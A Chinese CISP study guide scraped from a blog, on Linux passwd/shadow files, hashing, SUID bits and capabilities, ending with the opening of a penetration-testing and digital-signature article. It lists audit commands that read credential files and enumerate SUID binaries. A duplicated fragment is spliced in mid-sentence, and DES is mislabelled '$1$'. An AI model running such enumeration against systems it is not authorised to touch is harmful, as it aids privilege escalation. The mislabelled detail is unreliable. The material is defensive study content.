passwd文件是真实的，只是密码被转移了 &quot;x&quot;是加密结果 &quot;x&quot;不是加密结果，是占位符 账户被禁用 “x&quot;不表示禁用，禁用通常用”!“或”*&quot; 2.2 shadow文件格式 shadow文件的字段结构： username:encrypted_password:lastchg:min:max:warn:inactive:expire:reserved 各字段说明： 字段 说明 示例 username 用户名 root encrypted_password 加密密码 $6$salt$hash… lastchg 最后修改日期 19000（距1970-01-01的天数） min 最小修改间隔 0（天） max 最大有效期 99999（天） warn 警告期 7（天） inactive 非活动期 30（天） expire 账户过期日期 空或日期 reserved 保留字段 空 shadow文件示例： root:$6$rounds&#x3D;5000$salt$hash...:19000:0:99999:7::: user1:$6$rounds&#x3D;5000$salt$hash...:19000:0:90:7:30:: user2:!:19000:0:99999:7::: user3:*:19000:0:99999:7::: 2.3 密码字段的特殊值 密码字段的不同状态： 值 含义 说明 $6$… 正常加密密码 用户可以正常登录 ! 账户锁定 密码前加&quot;!&quot;，账户被锁定 * 账户禁用 不能通过密码登录 !! 密码未设置 新创建的账户，未设置密码 空 无密码 不安全，不推荐 账户状态示例： # 正常账户 user1:$6$salt$hash...:19000:0:99999:7::: # 锁定账户（密码前加!） user2:!$6$salt$hash...:19000:0:99999:7::: # 禁用账户 user3:*:19000:0:99999:7::: # 未设置密码 user4:!!:19000:0:99999:7::: 三、密码加密机制 3.1 密码加密算法 Linux支持的密码加密算法： graph TB A[\"密码加密算法\"] B[\"DES\"] C[\"MD5\"] D[\"SHA-256\"] E[\"SHA-512\"] A --> B A --> C A --> D A --> E B --> B1[\"$1$已淘汰\"] C --> C1[\"$1$不推荐\"] D --> D1[\"$5$推荐\"] E --> E1[\"$6$最推荐\"] style B fill:#ffcdd2,stroke:#b71c1c style C fill:#ffccbc,stroke:#d84315 style D fill:#c8e6c9,stroke:#2e7d32 style E fill:#a5d6a7,stroke:#1b5e20 密码格式说明： $id$salt$encrypted $id$: 算法标识 $1$ &#x3D; MD5 $2a$ &#x3D; Blowfish $5$ &#x3D; SHA-256 $6$ &#x3D; SHA-512 $salt$: 盐值（随机字符串） $encrypted: 加密后的密码哈希 密码示例： # SHA-512加密（推荐） $6$rounds&#x3D;5000$saltstring$hash... # SHA-256加密 $5$rounds&#x3D;5000$saltstring$hash... # MD5加密（不推荐） $1$saltstring$hash... 3.2 密码安全机制 密码安全的关键要素： 💡 密码安全机制🧂 盐值（Salt） 每个密码使用不同的随机盐值 防止彩虹表攻击 相同密码产生不同哈希 🔄 迭代次数（Rounds） 多次哈希运算 增加破解难度 默认5000次 可以配置更高 🔐 单向加密 不可逆的哈希算法 无法从哈希还原密码 只能通过比对验证 ⏱️ 密码策略 最小长度要求 复杂度要求 定期更换 历史密码检查 密码验证流程： sequenceDiagram participant U as 用户 participant S as 系统 participant P as /etc/passwd participant SH as /etc/shadow U->>S: 输入用户名和密码 S->>P: 查询用户名 P->>S: 返回UID和\"x\" S->>SH: 读取shadow文件 SH->>S: 返回加密密码和盐值 S->>S: 使用相同盐值加密输入密码 S->>S: 比对哈希值 alt 哈希匹配 S->>U: 登录成功 else 哈希不匹配 S->>U: 登录失败 end style S fill:#e3f2fd,stroke:#1976d2 style SH fill:#ffebee,stroke:#c62828 四、用户账户管理 4.1 账户类型 Linux系统中的账户类型： 账户类型 UID范围 用途 示例 root账户 0 超级用户 root 系统账户 1-999 系统服务 daemon, bin, sys 普通用户 1000+ 普通用户 user1, user2 服务账户 自定义 应用服务 mysql, apache, nginx 4.2 账户管理命令 常用账户管理命令： # 创建用户 useradd username useradd -m -s &#x2F;bin&#x2F;bash username # 设置密码 passwd username # 修改用户 usermod -l newname oldname usermod -L username # 锁定账户 usermod -U username # 解锁账户 # 删除用户 userdel username userdel -r username # 同时删除主目录 # 查看用户信息 id username finger username getent passwd username 4.3 密码策略配置 密码策略配置文件： # &#x2F;etc&#x2F;login.defs PASS_MAX_DAYS 90 # 密码最大有效期 PASS_MIN_DAYS 0 # 密码最小修改间隔 PASS_MIN_LEN 8 # 密码最小长度 PASS_WARN_AGE 7 # 密码过期警告期 # &#x2F;etc&#x2F;security&#x2F;pwquality.conf minlen &#x3D; 12 # 最小长度 dcredit &#x3D; -1 # 至少1个数字 ucredit &#x3D; -1 # 至少1个大写字母 lcredit &#x3D; -1 # 至少1个小写字母 ocredit &#x3D; -1 # 至少1个特殊字符 五、系统安全最佳实践 5.1 passwd和shadow文件保护 文件权限设置： # 检查文件权限 ls -l &#x2F;etc&#x2F;passwd &#x2F;etc&#x2F;shadow # 正确的权限设置 -rw-r--r-- 1 root root &#x2F;etc&#x2F;passwd # 644 -rw------- 1 root root &#x2F;etc&#x2F;shadow # 600 # 修复权限（如果需要） chmod 644 &#x2F;etc&#x2F;passwd chmod 600 &#x2F;etc&#x2F;shadow chown root:root &#x2F;etc&#x2F;passwd &#x2F;etc&#x2F;shadow 文件完整性检查： # 使用pwck检查passwd文件 pwck # 使用grpck检查group文件 grpck # 备份重要文件 cp &#x2F;etc&#x2F;passwd &#x2F;etc&#x2F;passwd.bak cp &#x2F;etc&#x2F;shadow &#x2F;etc&#x2F;shadow.bak 5.2 账户安全加固 安全加固措施： 账户安全加固清单： ├── 密码策略 │ ├── 强制复杂密码 │ ├── 定期更换密码 │ ├── 密码历史检查 │ └── 账户锁定策略 ├── 账户管理 │ ├── 禁用不必要的账户 │ ├── 删除默认账户 │ ├── 限制root登录 │ └── 使用sudo代替root ├── 登录控制 │ ├── 限制登录时间 │ ├── 限制登录地点 │ ├── 登录失败锁定 │ └── 会话超时 └── 审计监控 ├── 登录日志监控 ├── 密码修改记录 ├── 账户变更审计 └── 异常行为检测 5.3 常见安全问题 需要注意的安全问题： 问题 风险 解决方案 弱密码 容易被破解 强制密码策略 共享账户 无法追溯 每人独立账户 默认密码 已知密码 首次登录强制修改 无密码账户 直接登录 设置强密码或禁用 过期账户 安全隐患 定期清理 root直接登录 风险高 使用sudo 六、Linux特殊权限位 6.1 SUID权限位 🔐 SUID权限位详解**SUID（Set User ID）**是Linux系统中的一种特殊权限位，当设置在可执行文件上时，允许用户以文件所有者的权限执行该文件。 核心概念： SUID位设置在文件所有者的执行权限位上 用&quot;s&quot;表示，替代原来的&quot;x&quot; 文件执行时，进程具有文件所有者的权限 常用于需要提权的系统命令 SUID权限位示例： # &#x2F;usr&#x2F;bin&#x2F;passwd文件的权限 -rwsr-xr-x 1 root root 59640 Mar 22 2019 &#x2F;usr&#x2F;bin&#x2F;passwd 权限位解析： -rwsr-xr-x │││││││││└─ 其他用户可执行 ││││││││└── 其他用户可读 │││││││└─── 其他用户无写权限 ││││││└──── 所属组可执行 │││││└───── 所属组可读 ││││└────── 所属组无写权限 │││└─────── 所有者可执行（s表示SUID） ││└──────── 所有者可读 │└───────── 所有者可写 └────────── 普通文件 6.2 SUID权限位的含义 💡 Linux文件权限中的's'位Linux系统文件的访问权限属性通过9个字符来表示，分别表示文件属主、文件所属组用户的读（r）、写（w）及执行（x）的权限。 以/usr/bin/passwd文件为例： -rwsr-xr-x 1 root root 59640 Mar 22 2019 /usr/bin/passwd 关键理解： ✅ s表示SUID位 s在user的x位，表示SUID 文件在执行阶段具有文件所有者的权限 执行时具有文件所有者（root）的权限 常见误解： ❌ 误解：文件权限出现了错误 s是合法的权限位，不是错误 ❌ 误解：s表示sticky位 sticky位用&quot;t&quot;表示，不是&quot;s&quot; sticky位设置在目录的其他用户执行位上 ❌ 误解：s表示SGID位 SGID位设置在所属组的执行位上 本例中s在所有者的执行位上 SUID的工作原理： sequenceDiagram participant U as 普通用户 participant P as passwd程序 participant S as /etc/shadow Note over U: UID=1000 U->>P: 执行/usr/bin/passwd Note over P: SUID位设置所有者=root(UID=0) P->>P: 进程EUID=0（root） Note over P: 临时获得root权限 P->>S: 修改/etc/shadow Note over S: 只有root可写 S->>P: 修改成功 P->>U: 密码修改完成 Note over U: 进程结束权限恢复 6.3 为什么passwd命令需要SUID passwd命令的特殊需求： 📝 passwd命令案例场景： 普通用户需要修改自己的密码 问题： 密码存储在/etc/shadow文件中 /etc/shadow文件只有root可以写入 普通用户无法直接修改shadow文件 解决方案： passwd命令设置SUID位 执行时临时获得root权限 可以修改shadow文件 执行完成后权限恢复 权限对比： | 文件 | 权限 | 说明 | |------|------|------| | /etc/shadow | -rw------- | 只有root可写 | | /usr/bin/passwd | -rwsr-xr-x | 设置SUID位 | | 执行时进程 | EUID=0 | 临时root权限 | 6.4 SUID权限设置 设置和取消SUID： # 设置SUID位 chmod u+s filename chmod 4755 filename # 取消SUID位 chmod u-s filename chmod 0755 filename # 查找系统中所有SUID文件 find &#x2F; -perm -4000 -type f 2&gt;&#x2F;dev&#x2F;null # 查找SUID和SGID文件 find &#x2F; -perm -6000 -type f 2&gt;&#x2F;dev&#x2F;null SUID权限表示： 数字表示 符号表示 说明 4755 rwsr-xr-x SUID + 755 4750 rwsr-x— SUID + 750 4700 rwsr----- SUID + 700 6.5 SUID安全风险 ⚠️ SUID安全风险潜在风险： 🔴 权限提升攻击 恶意程序设置SUID位 普通用户获得root权限 系统被完全控制 🔴 漏洞利用 SUID程序存在漏洞 攻击者利用漏洞提权 执行任意命令 🔴 误用风险 不必要的文件设置SUID 扩大攻击面 增加安全风险 安全建议： 定期审计SUID文件 移除不必要的SUID位 监控SUID文件变化 使用capabilities替代SUID 常见SUID程序： # 系统必需的SUID程序 &#x2F;usr&#x2F;bin&#x2F;passwd # 修改密码 &#x2F;usr&#x2F;bin&#x2F;sudo # 权限提升 &#x2F;usr&#x2F;bin&#x2F;su # 切换用户 &#x2F;bin&#x2F;ping # 网络诊断 &#x2F;usr&#x2F;bin&#x2F;mount # 挂载文件系统 &#x2F;usr&#x2F;bin&#x2F;umount # 卸载文件系统 6.6 SGID和Sticky位 其他特殊权限位： 权限位 数字 符号 作用 SUID 4000 s（所有者x位） 以文件所有者权限执行 SGID 2000 s（所属组x位） 以文件所属组权限执行 Sticky 1000 t（其他用户x位） 只有所有者可删除 SGID示例： # 目录设置SGID drwxrwsr-x 2 root staff 4096 Jan 1 12:00 &#x2F;shared # 在该目录创建的文件自动继承组 # 新文件所属组为staff，而不是创建者的默认组 Sticky位示例： # &#x2F;tmp目录的sticky位 drwxrwxrwt 10 root root 4096 Jan 1 12:00 &#x2F;tmp # 任何用户可以在&#x2F;tmp创建文件 # 但只能删除自己的文件 # 不能删除其他用户的文件 七、Linux Capabilities机制 7.1 Capabilities概述 💡 什么是Linux Capabilities传统权限模型的问题： 只有root和非root两种权限 root拥有所有权限（全能） 非root用户权限受限 需要提权时只能使用SUID Capabilities机制： 将root权限细分为多个独立能力 可以单独授予特定能力 不需要完整root权限 更精细的权限控制 减少SUID程序的使用 优势： 最小权限原则 降低安全风险 更灵活的权限管理 更好的安全隔离 Capabilities vs SUID： graph TB A[\"权限需求\"] B[\"传统方案：SUID\"] C[\"现代方案：Capabilities\"] A --> B A --> C B --> B1[\"授予完整root权限\"] B --> B2[\"安全风险高\"] B --> B3[\"权限过大\"] C --> C1[\"只授予需要的能力\"] C --> C2[\"安全风险低\"] C --> C3[\"最小权限\"] style B fill:#ffcdd2,stroke:#b71c1c style C fill:#c8e6c9,stroke:#2e7d32 7.2 常用Capabilities列表 重要的Capabilities： Capability 说明 用途示例 CAP_CHOWN 修改文件所有者 文件管理工具 CAP_DAC_OVERRIDE 绕过文件权限检查 备份程序 CAP_FOWNER 绕过文件所有者检查 系统管理工具 CAP_KILL 发送信号给任意进程 进程管理器 CAP_NET_ADMIN 网络管理操作 网络配置工具 CAP_NET_BIND_SERVICE 绑定特权端口（&lt;1024） Web服务器 CAP_NET_RAW 使用RAW和PACKET套接字 ping, tcpdump CAP_SETUID 设置进程UID sudo, su CAP_SETGID 设置进程GID sudo, su CAP_SYS_ADMIN 系统管理操作 mount, swapon CAP_SYS_TIME 修改系统时间 date, ntpd 7.3 Capabilities管理 查看和设置Capabilities： # 查看文件的capabilities getcap &#x2F;usr&#x2F;bin&#x2F;ping # 输出：&#x2F;usr&#x2F;bin&#x2F;ping &#x3D; cap_net_raw+ep # 设置capabilities sudo setcap cap_net_raw+ep &#x2F;usr&#x2F;bin&#x2F;ping # 移除capabilities sudo setcap -r &#x2F;usr&#x2F;bin&#x2F;ping # 查看进程的capabilities getpcaps &lt;PID&gt; cat &#x2F;proc&#x2F;&lt;PID&gt;&#x2F;status | grep Cap # 查找所有具有capabilities的文件 sudo find &#x2F; -type f -exec getcap &#123;&#125; \\; 2&gt;&#x2F;dev&#x2F;null Capabilities标志： 标志 说明 e (Effective) 当前生效的能力 p (Permitted) 允许的能力 i (Inheritable) 可继承的能力 7.4 Capabilities实战案例 案例1：ping命令不使用SUID 📝 ping命令优化传统方案（SUID）： # ping需要root权限发送ICMP包 -rwsr-xr-x 1 root root &#x2F;bin&#x2F;ping # 问题：授予了完整root权限 **现代方案（Capabilities）：** # 只授予网络原始套接字能力 sudo setcap cap_net_raw+ep &#x2F;usr&#x2F;bin&#x2F;ping # 移除SUID位 sudo chmod u-s &#x2F;usr&#x2F;bin&#x2F;ping # 验证 getcap &#x2F;usr&#x2F;bin&#x2F;ping # 输出：cap_net_raw+ep # 测试 ping google.com # 正常工作，但没有root权限 **优势：** - 只有发送ICMP包的能力 - 没有其他root权限 - 安全性大幅提升 案例2：Web服务器绑定80端口 # 传统方案：以root运行 sudo &#x2F;usr&#x2F;sbin&#x2F;nginx # 问题：整个进程以root运行 # 现代方案：使用capabilities sudo setcap cap_net_bind_service+ep &#x2F;usr&#x2F;sbin&#x2F;nginx # 以普通用户运行 &#x2F;usr&#x2F;sbin&#x2F;nginx # 可以绑定80端口，但没有root权限 7.5 Capabilities安全最佳实践 安全建议： Capabilities安全清单： ├── 最小权限原则 │ ├── 只授予必需的能力 │ ├── 避免授予CAP_SYS_ADMIN │ ├── 定期审计capabilities │ └── 移除不必要的能力 ├── 替代SUID │ ├── 优先使用capabilities │ ├── 减少SUID程序数量 │ ├── 降低攻击面 │ └── 提高系统安全性 ├── 监控和审计 │ ├── 记录capabilities变更 │ ├── 监控异常授权 │ ├── 定期扫描文件 │ └── 审计日志分析 └── 容器安全 ├── 限制容器capabilities ├── 使用--cap-drop ├── 只添加必需能力 └── 避免--privileged 危险的Capabilities： ⚠️ 高风险Capabilities以下capabilities授予时需要特别谨慎： 🔴 CAP_SYS_ADMIN 几乎等同于root权限 可以执行大量管理操作 应该避免使用 🔴 CAP_DAC_OVERRIDE 绕过所有文件权限检查 可以读写任意文件 风险极高 🔴 CAP_SETUID / CAP_SETGID 可以切换到任意用户 可能导致权限提升 需要严格控制 🔴 CAP_SYS_MODULE 可以加载内核模块 可以完全控制系统 极度危险 八、总结 8.1 核心知识点回顾 Linux系统安全关键要素： mindmap root((Linux系统安全)) 用户认证 /etc/passwd /etc/shadow 密码加密 账户管理 权限控制 基本权限 特殊权限位 SUID/SGID/Sticky Capabilities 安全加固 密码策略 账户审计 权限最小化 监控告警 最佳实践 定期审计 及时更新 安全配置 应急响应 8.2 重要考点总结 CISP考试重点： 📚 考试重点1. passwd和shadow文件 passwd文件格式和字段含义 为什么密码字段显示为&quot;x&quot; shadow文件的作用和权限 密码加密算法识别 2. 特殊权限位 SUID位的含义和作用 如何识别SUID文件（s标志） SUID的安全风险 SGID和Sticky位的区别 3. Capabilities机制 Capabilities的优势 常用capabilities的作用 如何替代SUID 安全最佳实践 4. 安全加固 密码策略配置 账户安全检查 权限审计方法 日志监控要点 8.3 实战技能清单 必须掌握的命令： # 用户管理 useradd, usermod, userdel, passwd id, finger, getent # 权限管理 chmod, chown, chgrp ls -l, stat # 特殊权限 find &#x2F; -perm -4000 # 查找SUID find &#x2F; -perm -2000 # 查找SGID find &#x2F; -perm -1000 # 查找Sticky # Capabilities getcap, setcap, getpcaps # 安全审计 pwck, grpck last, lastlog who, w 8.4 安全检查清单 日常安全检查项目： 检查项 命令 频率 检查SUID文件 find / -perm -4000 每周 审计用户账户 cat /etc/passwd 每周 检查密码策略 cat /etc/login.defs 每月 查看登录日志 last, lastlog 每天 检查文件权限 ls -l /etc/passwd /etc/shadow 每周 审计capabilities find / -exec getcap {} ; 每月 8.5 延伸学习资源 推荐学习方向： 深入学习路径： ├── Linux安全基础 │ ├── 用户和组管理 │ ├── 文件权限系统 │ ├── PAM认证机制 │ └── SELinux&#x2F;AppArmor ├── 系统加固 │ ├── 安全基线配置 │ ├── 服务最小化 │ ├── 防火墙配置 │ └── 入侵检测 ├── 审计和监控 │ ├── 日志管理 │ ├── 审计系统（auditd） │ ├── 安全监控工具 │ └── 应急响应 └── 高级主题 ├── 容器安全 ├── 内核安全 ├── 安全编程 └── 渗透测试 九、参考资料 官方文档： Linux man pages: passwd(5), shadow(5), capabilities(7) Red Hat Enterprise Linux Security Guide Ubuntu Security Documentation 安全标准： CIS Linux Benchmark NIST Security Configuration Checklist PCI DSS Linux Security Requirements 工具和资源： Lynis - Linux安全审计工具 AIDE - 文件完整性检查 fail2ban - 登录保护 auditd - Linux审计系统 系列文章： 本文是CISP学习指南系列的一部分，更多内容请关注： CISP学习指南：网络安全基础 CISP学习指南：密码学原理 CISP学习指南：应用安全 CISP学习指南：安全管理 相关文章： Linux权限管理深度解析 系统安全加固实战 CISP认证备考指南所有者是root 普通用户执行passwd时，临时获得root权限 可以修改shadow文件 执行完成后，权限恢复 安全性： passwd程序内部有权限检查 用户只能修改自己的密码 不能修改其他用户的密码（除非是root） 限制了SUID权限的滥用 6.4 三种特殊权限位对比 Linux三种特殊权限位： 权限位 符号 位置 数字表示 作用 示例 SUID s 所有者执行位 4000 以所有者权限执行 /usr/bin/passwd SGID s 所属组执行位 2000 以所属组权限执行 /usr/bin/wall Sticky t 其他用户执行位 1000 只有所有者可删除 /tmp 权限位示例： # SUID示例 -rwsr-xr-x 1 root root &#x2F;usr&#x2F;bin&#x2F;passwd ↑ SUID位 # SGID示例 -rwxr-sr-x 1 root tty &#x2F;usr&#x2F;bin&#x2F;wall ↑ SGID位 # Sticky示例 drwxrwxrwt 10 root root &#x2F;tmp ↑ Sticky位 6.5 设置和管理SUID 设置SUID权限： # 使用符号模式设置SUID chmod u+s filename # 使用数字模式设置SUID chmod 4755 filename # 移除SUID chmod u-s filename # 查找系统中所有SUID文件 find &#x2F; -perm -4000 -type f 2&gt;&#x2F;dev&#x2F;null # 查找SUID和SGID文件 find &#x2F; -perm &#x2F;6000 -type f 2&gt;&#x2F;dev&#x2F;null SUID权限的安全风险： ⚠️ SUID安全风险潜在风险： 🔓 权限提升 SUID程序如果有漏洞，可能被利用提权 攻击者可以获得root权限 🐛 程序漏洞 缓冲区溢出 命令注入 路径遍历 🔍 安全审计 定期检查SUID文件 移除不必要的SUID权限 监控SUID文件变化 最佳实践： 最小化SUID文件数量 定期审计SUID程序 使用sudo代替SUID 监控SUID文件的创建和修改 常见的SUID程序： # 系统中常见的SUID程序 &#x2F;usr&#x2F;bin&#x2F;passwd # 修改密码 &#x2F;usr&#x2F;bin&#x2F;su # 切换用户 &#x2F;usr&#x2F;bin&#x2F;sudo # 以其他用户身份执行命令 &#x2F;usr&#x2F;bin&#x2F;mount # 挂载文件系统 &#x2F;usr&#x2F;bin&#x2F;umount # 卸载文件系统 &#x2F;usr&#x2F;bin&#x2F;ping # 发送ICMP包（需要raw socket） &#x2F;usr&#x2F;bin&#x2F;chsh # 修改登录Shell &#x2F;usr&#x2F;bin&#x2F;chfn # 修改用户信息 七、总结 Linux系统安全的核心要点： /etc/passwd文件：存储用户基本信息，所有用户可读 /etc/shadow文件：存储加密密码，只有root可读 密码字段&quot;x&quot;：表示密码存储在shadow文件中，不是加密结果 密码加密：使用盐值和多次哈希，推荐SHA-512 账户管理：合理分配UID，使用强密码策略 安全加固：正确设置文件权限，定期审计账户 SUID权限位：允许用户以文件所有者权限执行，需谨慎使用 🎯 关键要点 /etc/passwd文件用于用户登录时校验用户信息 密码字段显示为&quot;x&quot;表示密码存储在/etc/shadow文件中 &quot;x&quot;不是密码的加密结果，只是占位符 shadow文件只有root可读，大大提高了安全性 密码使用单向加密算法，无法还原 应该使用强密码策略和定期更换密码 定期检查和审计用户账户 SUID位设置在所有者执行位，用&quot;s&quot;表示 SUID文件执行时具有文件所有者的权限 passwd命令需要SUID才能修改shadow文件 应最小化SUID文件数量，定期审计 💡 实践建议 定期审计passwd和shadow文件 使用pwck和grpck检查文件完整性 实施强密码策略 禁用或删除不必要的账户 使用sudo代替直接root登录 监控登录日志和账户变更 定期备份重要配置文件","categories":[{"name":"Cybersecurity","slug":"Cybersecurity","permalink":"https://neo01.com/categories/Cybersecurity/"}],"tags":[{"name":"CISP","slug":"CISP","permalink":"https://neo01.com/tags/CISP/"}],"lang":"zh-CN"},{"title":"CISP学习指南：渗透测试与安全技术","slug":"2025/10/CISP-Penetration-Testing-Security-Tech-zh-CN","date":"un44fin44","updated":"un33fin33","comments":true,"path":"/zh-CN/2025/10/CISP-Penetration-Testing-Security-Tech/","permalink":"https://neo01.com/zh-CN/2025/10/CISP-Penetration-Testing-Security-Tech/","excerpt":"深入解析CISP认证中的渗透测试、数字签名、HTTPS协议等安全技术知识点。","text":"渗透测试是评估系统安全性的重要手段，通过模拟攻击者的行为发现系统中的安全漏洞和弱点。 一、渗透测试 1.1 渗透测试概述 渗透测试的定义： 🎯 什么是渗透测试渗透测试（Penetration Testing）是一种通过模拟恶意攻击者的技术和方法，对目标系统进行安全评估的方法。 核心特点： 🔍 逆向角度 从攻击者的角度审视系统 发现防御体系的薄弱环节 验证安全控制的有效性 🎭 模拟攻击 使用真实的攻击技术 在受控环境下进行 不造成实际损害 📊 价值体现 测试软件在实际系统中运行时的安全状况 发现设计和实现中的安全缺陷 提供改进建议 graph TB A[\"渗透测试\"] B[\"信息收集\"] C[\"漏洞分析\"] D[\"漏洞利用\"] E[\"权限提升\"] F[\"报告编写\"] A --> B B --> C C --> D D --> E E --> F B --> B1[\"目标识别\"] C --> C1[\"漏洞扫描\"] D --> D1[\"攻击测试\"] E --> E1[\"深入渗透\"] F --> F1[\"风险评估\"] style B fill:#e3f2fd,stroke:#1976d2 style C fill:#fff3e0,stroke:#f57c00 style D fill:#e8f5e9,stroke:#388e3d style E fill:#f3e5f5,stroke:#7b1fa2 style F fill:#ffebee,stroke:#c62828 1.2 渗透测试过程 💡 渗透测试过程的关键要点测试前的风险控制： 由于在实际渗透测试过程中存在不可预知的风险，测试前必须提醒用户进行系统和数据备份，以便出现问题时可以及时恢复系统和数据。渗透测试可能导致系统不稳定，可能造成数据损坏或丢失，必须提前备份以防万一，这是渗透测试的基本安全要求。 渗透测试的价值： 渗透测试从&quot;逆向&quot;的角度出发，测试软件系统的安全性，其价值在于可以测试软件在实际系统中运行时的安全状况。从攻击者角度审视系统，发现实际运行环境中的安全问题，验证安全控制的有效性。 标准测试流程： 渗透测试应当经过方案制定、信息收集、漏洞利用、完成渗透测试报告等步骤。这是标准的渗透测试流程，每个步骤都不可或缺，确保测试的系统性和完整性。 时间选择的误区： ❌ 不应在系统正常业务运行高峰期进行渗透测试。高峰期测试可能导致业务中断，影响用户体验和业务连续性，应选择业务低峰期或维护窗口进行。 渗透测试时间选择原则： graph LR A[\"渗透测试时间选择\"] B[\"✅ 推荐时间\"] C[\"❌ 避免时间\"] A --> B A --> C B --> B1[\"业务低峰期\"] B --> B2[\"维护窗口\"] B --> B3[\"非工作时间\"] B --> B4[\"测试环境\"] C --> C1[\"业务高峰期\"] C --> C2[\"关键业务时段\"] C --> C3[\"重要活动期间\"] C --> C4[\"无备份情况下\"] style B fill:#c8e6c9,stroke:#2e7d32 style C fill:#ffcdd2,stroke:#b71c1c 1.3 渗透测试流程详解 完整的渗透测试流程： 渗透测试完整流程： ├── 1. 前期准备 │ ├── 明确测试目标和范围 │ ├── 签署授权协议 │ ├── 制定测试方案 │ ├── 准备测试工具 │ └── 通知相关人员 ├── 2. 信息收集 │ ├── 目标识别 │ ├── 网络拓扑探测 │ ├── 端口扫描 │ ├── 服务识别 │ └── 指纹识别 ├── 3. 漏洞分析 │ ├── 漏洞扫描 │ ├── 手工验证 │ ├── 漏洞分类 │ └── 风险评估 ├── 4. 漏洞利用 │ ├── 选择攻击向量 │ ├── 构造攻击载荷 │ ├── 执行攻击测试 │ └── 记录测试过程 ├── 5. 权限提升 │ ├── 获取更高权限 │ ├── 横向移动 │ ├── 持久化访问 │ └── 数据收集 ├── 6. 清理痕迹 │ ├── 删除测试文件 │ ├── 清理日志 │ ├── 恢复系统状态 │ └── 验证系统正常 └── 7. 报告编写 ├── 执行摘要 ├── 漏洞详情 ├── 风险评估 ├── 修复建议 └── 附录资料 1.4 渗透测试注意事项 渗透测试的关键注意事项： ⚠️ 渗透测试风险控制测试前准备： 📋 授权和审批 必须获得书面授权 明确测试范围和边界 签署保密协议 确定应急联系人 💾 备份和恢复 完整备份系统和数据 验证备份可用性 准备恢复方案 测试恢复流程 ⏰ 时间选择 选择业务低峰期 避开关键业务时段 预留足够时间 制定时间表 👥 人员协调 通知相关人员 建立沟通机制 明确职责分工 准备应急响应 测试过程中的控制： 控制措施 说明 目的 范围控制 严格遵守授权范围 避免越权测试 强度控制 控制测试强度和频率 防止系统过载 监控机制 实时监控系统状态 及时发现异常 应急预案 准备应急响应方案 快速处理问题 记录留存 详细记录测试过程 便于分析和审计 1.5 渗透测试类型 按测试者掌握的信息分类： graph TB A[\"渗透测试类型\"] B[\"黑盒测试Black Box\"] C[\"白盒测试White Box\"] D[\"灰盒测试Gray Box\"] A --> B A --> C A --> D B --> B1[\"无系统信息\"] B --> B2[\"模拟外部攻击\"] C --> C1[\"完整系统信息\"] C --> C2[\"模拟内部攻击\"] D --> D1[\"部分系统信息\"] D --> D2[\"模拟混合场景\"] style B fill:#263238,stroke:#000,color:#fff style C fill:#eceff1,stroke:#000 style D fill:#78909c,stroke:#000,color:#fff 三种测试类型对比： 类型 信息掌握程度 优点 缺点 适用场景 黑盒测试 无或极少 真实模拟外部攻击 耗时长，可能遗漏 评估外部威胁 白盒测试 完整信息 全面深入，效率高 不够真实 代码审计，内部评估 灰盒测试 部分信息 平衡真实性和效率 需要协调配合 综合安全评估 二、数字签名 2.1 数字签名概述 数字签名的定义： 🔐 什么是数字签名数字签名是一种用于验证数字信息真实性和完整性的密码学技术。 工作原理： 发送方使用私钥对消息摘要进行加密，生成数字签名 将签名附加到消息上一起发送 接收方使用发送方的公钥验证签名 验证成功则确认消息来源和完整性 graph LR A[\"原始消息\"] --> B[\"计算摘要\"] B --> C[\"私钥加密\"] C --> D[\"数字签名\"] E[\"接收消息\"] --> F[\"计算摘要\"] E --> G[\"公钥解密签名\"] G --> H[\"对比摘要\"] F --> H H --> I[\"验证结果\"] style A fill:#e3f2fd,stroke:#1976d2 style D fill:#e8f5e9,stroke:#388e3d style I fill:#fff3e0,stroke:#f57c00 2.2 数字签名的安全特性 💡 数字签名的安全特性数字签名可以实现的安全特性： ✅ 防抵赖 发送方无法否认已签名的消息 因为只有发送方拥有私钥 ✅ 防伪造 攻击者无法伪造有效签名 因为没有发送方的私钥 ✅ 防冒充 验证签名可确认发送方身份 防止他人冒充发送方 数字签名不能实现的安全特性： ❌ 保密通信 数字签名只验证身份和完整性 不对消息内容进行加密 任何人都可以读取消息内容 数字签名 vs 加密： graph TB A[\"密码学技术\"] B[\"数字签名\"] C[\"加密\"] A --> B A --> C B --> B1[\"私钥签名\"] B --> B2[\"公钥验证\"] B --> B3[\"保证真实性\"] B --> B4[\"保证完整性\"] B --> B5[\"防抵赖\"] C --> C1[\"公钥加密\"] C --> C2[\"私钥解密\"] C --> C3[\"保证机密性\"] C --> C4[\"防窃听\"] style B fill:#e3f2fd,stroke:#1976d2 style C fill:#fff3e0,stroke:#f57c00 数字签名的功能对比： 安全特性 数字签名 说明 身份认证 ✅ 支持 验证发送方身份 完整性 ✅ 支持 检测消息是否被篡改 防抵赖 ✅ 支持 发送方无法否认 防伪造 ✅ 支持 无法伪造有效签名 防冒充 ✅ 支持 确认真实发送方 机密性 ❌ 不支持 不加密消息内容 保密通信 ❌ 不支持 消息内容可被读取 2.3 数字签名的应用 数字签名的典型应用场景： 数字签名应用场景： ├── 电子合同 │ ├── 合同签署 │ ├── 法律效力 │ └── 防止抵赖 ├── 软件分发 │ ├── 代码签名 │ ├── 验证来源 │ └── 防止篡改 ├── 电子邮件 │ ├── 邮件签名 │ ├── 身份验证 │ └── 完整性保护 ├── 数字证书 │ ├── CA签名 │ ├── 证书验证 │ └── 信任链 └── 区块链 ├── 交易签名 ├── 身份验证 └── 防篡改 如何实现保密通信： 💡 数字签名 + 加密 = 完整安全要实现保密通信，需要结合使用： 🔐 加密（Encryption） 使用接收方的公钥加密消息 保证消息机密性 只有接收方能解密 ✍️ 数字签名（Digital Signature） 使用发送方的私钥签名 保证消息真实性和完整性 防止抵赖和伪造 完整流程： 发送方用自己的私钥签名（身份认证） 发送方用接收方的公钥加密（保密性） 接收方用自己的私钥解密（获取内容） 接收方用发送方的公钥验证签名（验证身份） 三、HTTPS协议 3.1 HTTP协议概述 HTTP协议的特点： 🌐 HTTP协议HTTP（HyperText Transfer Protocol）超文本传输协议 📋 基本特点： 应用层协议 基于TCP/IP 无状态协议 明文传输 ⚠️ 安全问题： 数据明文传输，易被窃听 无法验证通信方身份 无法验证数据完整性 容易被中间人攻击 3.2 HTTPS协议 💡 基于HTTP的安全协议超文本传输协议（HyperText Transfer Protocol, HTTP）是互联网上广泛使用的一种网络协议。 HTTP协议的局限性： ❌ HTTP 1.0和HTTP 1.1协议 都是明文协议 不具备加密功能 不支持用户鉴别 HTTP 1.1虽然增加了持久连接等特性，但仍不支持加密和鉴别 安全的解决方案： ✅ HTTPS协议 HTTPS = HTTP + SSL/TLS 提供加密传输 支持服务器身份验证 支持客户端身份验证（可选） 